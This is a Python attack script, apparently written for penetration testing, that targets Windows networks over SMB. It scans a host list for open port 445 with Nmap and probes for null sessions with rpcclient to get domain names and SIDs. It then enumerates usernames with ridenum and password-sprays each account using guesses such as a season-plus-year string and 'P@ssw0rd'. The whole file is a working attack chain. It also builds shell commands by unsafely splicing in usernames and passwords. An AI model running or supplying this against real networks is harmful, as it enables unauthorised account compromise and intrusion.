#!/usr/bin/env python3

import sys
import os
import time
import asyncio
import argparse
import functools
from netaddr import IPNetwork
from datetime import datetime
from itertools import zip_longest
from libnmap.process import NmapProcess
from asyncio.subprocess import PIPE, STDOUT
from libnmap.parser import NmapParser, NmapParserException
# debug
#from IPython import embed

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-x", "--xml", help="path to Nmap XML file")
    parser.add_argument("-p", "--password-list", help="path to password list file")
    return parser.parse_args()

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        report = NmapParser.parse_fromfile(args.xml)
    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                if '/' in line:
                    hosts += [str(ip) for ip in IPNetwork(line)]
                elif '*' in line:
                    sys.exit('[-] CIDR notation only in the host list e.g. 10.0.0.0/24')
                else:
                    hosts.append(line)
        report = nmap_scan(hosts)
    else:
        print('Use the "-x [path/to/nmap-output.xml]" option if you already have an Nmap XML file \
or "-l [hostlist.txt]" option to run an Nmap scan with a hostlist file.')
        sys.exit()
    return report

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    # This is top 1000 tcp + top 50 UDP scan
    # Nmap has chosen not to do --top-udp/tcp-ports options due to not wanting to overcomplicate
    # the cmd line interface
    nmap_args = '-sS -n --max-retries 5 -p 445 -oA smb-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/smb-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1 
    while nmap_proc.is_running():
        i += 1
        x = -.5
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print("[*] Nmap running: {} min".format(str(i)))
        time.sleep(1)

def get_hosts(report):
    '''
    Gets list of hosts with port 445 open
    '''
    hosts = []
    for host in report.hosts:
        if host.is_up():
            for s in host.services:
                if s.port == 445:
                    if s.state == 'open':
                        ip = host.address
                        print('[+] SMB open: {}'.format(ip))
                        hosts.append(ip)
    if len(hosts) == 0:
        sys.exit('[-] No hosts were found with port 445 open')
    return hosts

def coros_pool(worker_count, commands):
    '''
    A pool without a pool library
    '''
    coros = []
    if len(commands) > 0:
        while len(commands) > 0:
            for i in range(worker_count):
                # Prevents crash if [commands] isn't divisible by 5
                if len(commands) > 0:
                    coros.append(get_output(commands.pop()))
                else:
                    return coros
    return coros

def async_get_outputs(loop, commands):
    '''
    Asynchronously run commands and get get their output in a list
    '''
    output = []

    if len(commands) == 0:
        return output

    # Get commands output in parallel
    worker_count = len(commands)
    if worker_count > 10:
        worker_count = 10

    # Create pool of coroutines
    coros = coros_pool(worker_count, commands)

    # Run the pool of coroutines
    if len(coros) > 0:
        output += loop.run_until_complete(asyncio.gather(*coros))

    return output

def create_cmds(hosts, cmd):
    '''
    Creates the list of comands to run
    cmd looks likes "rpcclient ... {}"
    '''
    commands = []
    for ip in hosts:
        formatted_cmd = 'echo {} && '.format(ip) + cmd.format(ip)
        commands.append(formatted_cmd)
    return commands

def get_null_sess_hosts(output):
    '''
    Gets a list of all hosts vulnerable to SMB null sessions
    '''
    null_sess_hosts = {}
    # output is a list of rpcclient output
    for out in output:
        if 'Domain Name:' in out:
            out = out.splitlines()
            ip = out[0]
                         # Just get domain name
            dom = out[1].split()[2]
                         # Just get domain SID
            dom_sid = out[2].split()[2]
            null_sess_hosts[ip] = (dom, dom_sid)

    return null_sess_hosts

def print_domains(null_sess_hosts):
    '''
    Prints the unique domains
    '''
    uniq_doms = []
    for key,val in null_sess_hosts.items():
        dom_name = val[0]
        if dom_name not in uniq_doms:
            uniq_doms.append(dom_name)

    if len(uniq_doms) > 0:
        for d in uniq_doms:
            print('[+] Domain found: ' + d) 

@asyncio.coroutine
def get_output(cmd):
    '''
    Performs async OS commands
    '''
    p = yield from asyncio.create_subprocess_shell(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
    # Output returns in byte string so we decode to utf8
    return (yield from p.communicate())[0].decode('utf8')

def get_usernames(ridenum_output):

    ip_users = {}
    for host in ridenum_output:
        out_lines = host.splitlines()
        ip = out_lines[0]
        for line in out_lines:
                                          # No machine accounts
            if 'Account name:' in line and "$" not in line:
                user = line.split()[2]
                if ip in ip_users:
                    ip_users[ip] += [user]
                else:
                    ip_users[ip] = [user]

    return ip_users

def create_brute_cmds(ip_users, passwords):
    '''
    Creates the bruteforce commands
    '''
    already_tested = []
    cmds = []
    for ip,users in ip_users.items():
        for user in ip_users[ip]:
            if user not in already_tested:
                already_tested.append(user)
                print('[+] User found: ' + user)
                rpc_user_pass = []
                for pw in passwords:
                    #cmds.append('echo {} && rpcclient -U \
                    #"{}%{}" {} -c "exit"'.format(ip, user, pw, ip))
                    cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
                    # This is so when you get the output from the coros 
                    # you get the username and pw too
                    cmd2 = "echo '{}' ".format(cmd)+cmd
                    cmds.append(cmd2)

    return cmds

def create_passwords(args):
    '''
    Creates the passwords based on default AD requirements
    or user-defined values
    '''
    if args.password_list:
        with open(args.password_list, 'r') as f:
            # We have to be careful with .strip()
            # because password could contain a space
            passwords = [line.rstrip() for line in f]
    else:
        season_pw = create_season_pw()
        other_pw = "P@ssw0rd"
        passwords = [season_pw, other_pw]

    return passwords

def create_season_pw():
    '''
    Turn the date into the season + the year
    '''
    # Get the current day of the year
    doy = datetime.today().timetuple().tm_yday
    year = str(datetime.today().year)

    spring = range(80, 172)
    summer = range(172, 264)
    fall = range(264, 355)
    # winter = everything else

    if doy in spring:
        season = 'Spring'
    elif doy in summer:
        season = 'Summer'
    elif doy in fall:
        season = 'Fall'
    else:
        season = 'Winter'

    season_pw = season+year
    return season_pw

def main(report, args):

    # {ip:'domain name: xxx', 'domain sid: xxx'}
    null_sess_hosts = {}

    # get_hosts will exit script if no hosts are found
    print('[*] Parsing hosts')
    hosts = get_hosts(report)
    loop = asyncio.get_event_loop()
    dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
    dom_cmds = create_cmds(hosts, dom_cmd)
    print('[*] Checking for NULL SMB sessions')
    rpc_output = async_get_outputs(loop, dom_cmds)

    # {ip:'domain_name', 'domain_sid'}
    chunk_null_sess_hosts = get_null_sess_hosts(rpc_output)

    # Create master list of null session hosts
    null_sess_hosts.update(chunk_null_sess_hosts)
    if len(null_sess_hosts) == 0:
        sys.exit('[-] No null SMB sessions available')
    print_domains(null_sess_hosts)

    # Gather usernames using ridenum.py
    print('[*] Checking for usernames')
    ridenum_cmd = 'python ridenum/ridenum.py {} 500 50000'
    ridenum_cmds = create_cmds(hosts, ridenum_cmd)
    ridenum_output = async_get_outputs(loop, ridenum_cmds)
    if len(ridenum_output) == 0:
        sys.exit('[-] No usernames found')

    # {ip:username, username2], ip2:[username, username2]}
    ip_users = get_usernames(ridenum_output)
    passwords = create_passwords(args)

    # Creates a list of unique commands which only tests
    # each username/password combo 2 times and not more
    brute_cmds = create_brute_cmds(ip_users, passwords)
    brute_output = async_get_outputs(loop, brute_cmds)
    parse_brute_output(brute_output)
    loop.close()

def parse_brute_output(brute_output):
    '''
    Parse the chunk of rpcclient attempted logins
    '''
    print('[*] Checking passwords against accounts')
    pw_found = False
    for line in brute_output:
        # Missing second line of output means we have a hit
        if len(line.splitlines()) == 1:
            pw_found = True
            split = line.split()
            ip = split[1]
            user_pw = split[5].replace('"','').replace('%',':')
            print('[!] Password found! ' + user_pw)
    
    if pw_found == False:
        print('[-] No passwords found')

if __name__ == "__main__":

    args = parse_args()
    if os.geteuid():
        exit('[-] Run as root')
    report = parse_nmap(args)

    main(report, args)
